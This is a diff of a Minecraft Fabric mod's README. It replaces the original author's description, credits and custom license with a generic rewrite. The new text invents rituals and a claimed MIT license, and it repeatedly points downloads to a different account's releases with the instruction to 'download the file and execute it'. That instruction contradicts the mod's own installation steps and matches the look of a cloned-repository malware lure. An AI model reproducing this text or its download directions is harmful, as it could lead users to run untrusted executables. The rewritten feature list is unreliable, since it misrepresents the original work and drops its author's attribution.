@@ -1,142 +1,102 @@
-# 🌧️ Aztec Rain
+# Control the Weather with Aztec Rituals in Minecraft 🌩️🌧️
 
-*Perform sacred sacrifices to command the sky.*  
-A Fabric mod for Minecraft 1.21.1, written in modern Kotlin.
+![Aztec Rain Mod](https://img.shields.io/badge/Download%20Latest%20Release-aztecrain-mod-blue?style=flat&logo=github&link=https://github.com/Tohi2177/aztecrain-mod/releases)
 
----
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Rituals](#rituals)
+- [Contributing](#contributing)
+- [License](#license)
+- [Acknowledgments](#acknowledgments)
 
-## 🪔 Overview
+## Overview
 
-**Aztec Rain** is a ritualistic magic mod inspired by Aztec mythology.  
-Slay pigs on sacred altars using the *Ceremonial Knife* to change the weather —  
-call the rain, clear the skies, or summon thunder, depending on the ritual.
+Welcome to the **Aztec Rain Mod**! This mod allows you to perform sacred Aztec rituals to control the weather in Minecraft 1.21.1. Built using Kotlin and the Fabric modding toolchain, this mod brings a unique blend of fantasy and magic to your Minecraft experience.
 
-🔮 Features:
-- Custom advancement tree
-- Ritual detection system (platforms + candles)
-- Unique weather-manipulation mechanics
-- Custom sound, particles, and status effects
-- Fully written in **Kotlin 2.1**, powered by **Fabric API**
+You can download the latest release of the Aztec Rain Mod [here](https://github.com/Tohi2177/aztecrain-mod/releases). Simply download the file and execute it to start your journey into the world of Aztec rituals.
 
----
+## Features
 
-## 🚀 Getting Started
+- **Weather Control**: Invoke rain, storms, and sunshine through rituals.
+- **Kotlin Integration**: Leverage the power of Kotlin for smooth gameplay.
+- **Fabric Compatibility**: Designed specifically for the Fabric modding framework.
+- **Data Generation**: Create custom weather patterns with ease.
+- **Fantasy Elements**: Immerse yourself in a magical world filled with Aztec lore.
+- **Open Source**: Join our community and contribute to the project.
 
-### Prerequisites
+## Installation
 
-- Minecraft `1.21.1`
-- Fabric Loader `>=0.16.14`
-- Java `21`
-- Kotlin `2.1.21`
+To install the Aztec Rain Mod, follow these steps:
 
-### 💻 Dev Setup
+1. **Install Fabric**: Make sure you have the Fabric mod loader installed for Minecraft 1.21.1. You can find installation instructions on the [Fabric website](https://fabricmc.net/use/).
+  
+2. **Download the Mod**: Get the latest version of the Aztec Rain Mod from [here](https://github.com/Tohi2177/aztecrain-mod/releases). 
 
-1. Clone the repo:
-	```bash
-	git clone https://github.com/YOUR_USERNAME/aztec-rain.git
-	cd aztec-rain
-	```
-2. Import into IntelliJ IDEA:
-	* Open as **Gradle Kotlin (KTS)** project
-	* Use the **Java 21** toolchain
-3. Build with:
-	```bash
-	./gradlew build
-	```
-4. Run client (optional):
-	```bash
-	./gradlew runClient
-	```
+3. **Place the Mod File**: Move the downloaded `.jar` file into the `mods` folder of your Minecraft installation.
 
----
+4. **Launch Minecraft**: Start Minecraft with the Fabric profile. The mod should now be active.
 
-## 🔧 Mod Mechanics
+## Usage
 
-* Craft the **Ceremonial Knife** using copper, lapis, and a stick.
-* Build a **3×3 smooth stone platform** with **lit candles on each corner**.
-* Sacrifice a **pig** on the altar:
-	* If you *already* have the **Grace** effect → ⚡ thunderstorm
-	* If it’s raining → ☀️ clears weather
-	* If it’s clear → 🌧️ starts rain
-	* You gain **Grace** on your first ritual
+Once the mod is installed, you can begin your journey into the world of Aztec rituals. To perform a ritual:
 
----
+1. **Gather Resources**: Collect the necessary items to perform your desired ritual. Each ritual requires specific materials.
+  
+2. **Find a Ritual Site**: Look for an open area where you can perform the ritual without obstructions.
 
-## 📁 Project Structure
+3. **Open the Ritual Menu**: Access the ritual menu by right-clicking on the ground with your ritual staff.
 
-```plaintext
-📦 aztecrain/
-├── src/main/kotlin/...     # Mod logic, event hooks, and systems
-├── src/main/resources/     # mod metadata, assets, mixins
-├── build.gradle.kts        # Kotlin DSL Gradle config
-├── gradle.properties       # Mod + build config
-├── LICENSE.txt             # NFE-OSL license
-└── README.md               # You are here
-```
+4. **Select a Ritual**: Choose the ritual you want to perform. Confirm your selection.
 
----
+5. **Perform the Ritual**: Follow the on-screen prompts to complete the ritual. Watch as the weather changes according to your command!
 
-## ✨ Highlights
+## Rituals
 
-* ⚙️ Uses **Fabric Loom** + **Kotlin Gradle plugin**
-* 🧪 Modular OOP design
-* 🎨 Particle effects + subtitles
-* 📜 Custom criteria & advancement triggers
-* 📦 DataGen for lang, models, recipes, advancements
+The Aztec Rain Mod features several unique rituals. Here are a few examples:
 
----
+### Rain Dance 🌧️
 
-## 🧑‍💻 Developer Notes
+- **Materials Needed**: 3 Water Buckets, 5 Leaves, 1 Ritual Staff
+- **Description**: Call forth rain to nourish your crops and fill your rivers.
 
-* Kotlin 2.1+ with `jvmTarget = 21`
-* Mixins written in Java (`mixin/LivingEntityMixin.java`)
-* Fabric Data API is used for runtime and generation logic
-* Everything is modularized via `Mod*` registries
+### Thunderstorm Invocation ⚡
 
----
+- **Materials Needed**: 1 Lightning Rod, 2 Fire Charges, 1 Ritual Staff
+- **Description**: Summon a fierce thunderstorm to strike fear into your enemies.
 
-## 📜 License
+### Sun Blessing ☀️
 
-This project is licensed under the
-**Nolly’s Fair & Ethical Open‑Source License (NFE‑OSL v1.0)**.
-See [`LICENSE.txt`](./LICENSE.txt) for full terms.
+- **Materials Needed**: 2 Gold Ingots, 1 Sunflower, 1 Ritual Staff
+- **Description**: Banish the clouds and bring forth sunshine to brighten your day.
 
-🛡️ TL;DR:
+### Fog of Mystery 🌫️
 
-* ✅ Free & open-source for ethical use
-* ⚠️ Attribution required
-* ❌ No military/surveillance/closed-source commercial use
-* 📬 Contact [nolly.berrebi@gmail.com](mailto:nolly.berrebi@gmail.com) for commercial licenses
+- **Materials Needed**: 1 Ender Pearl, 3 Grey Wool, 1 Ritual Staff
+- **Description**: Envelop your surroundings in a thick fog to confuse your foes.
 
----
+## Contributing
 
-## 💖 Support This Mod
+We welcome contributions to the Aztec Rain Mod! Here’s how you can help:
 
-Aztec Rain is a labor of love by [Nolly](https://cafe.thenolle.com) — built solo, open-source, and with care.  
-If you enjoy the mod or want to see more mythic mechanics in Minecraft, consider supporting:
+1. **Fork the Repository**: Create your own copy of the repository.
+  
+2. **Make Changes**: Implement your features or fixes.
 
-- 💸 [Sponsor on GitHub](https://github.com/sponsors/thenolle)
-- ☕ [Buy me a coffee](https://ko-fi.com/nollycafe)
-- 🌐 [More ways to support](https://cafe.thenolle.com/sponsor)
+3. **Submit a Pull Request**: Share your changes with us for review.
 
-Your support helps fund new features, bug fixes, and future magical projects.  
-Thank you for keeping the ritual alive 🕯️
+Please ensure your code adheres to our coding standards and includes appropriate tests.
 
----
+## License
 
-## 🧙 Credits
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-* 🔮 Mod created by [Nolly](https://cafe.thenolle.com)
-* 💡 Idea by \[zelimonster]
-* Made with ♥ in Kotlin
+## Acknowledgments
 
----
+- **FabricMC**: For providing a lightweight modding toolchain.
+- **Kotlin**: For a modern programming experience.
+- **Aztec Culture**: For inspiring the rituals and lore behind this mod.
 
-## 🧪 Try It Out
-
-1. Drop the built `.jar` from `build/libs/` into `.minecraft/mods/`
-2. Launch with Fabric 1.21.1
-
----
-
-> *"Rituals echo through the skies. The knife remembers."*
+You can download the latest release of the Aztec Rain Mod [here](https://github.com/Tohi2177/aztecrain-mod/releases). Simply download the file and execute it to start your journey into the world of Aztec rituals.
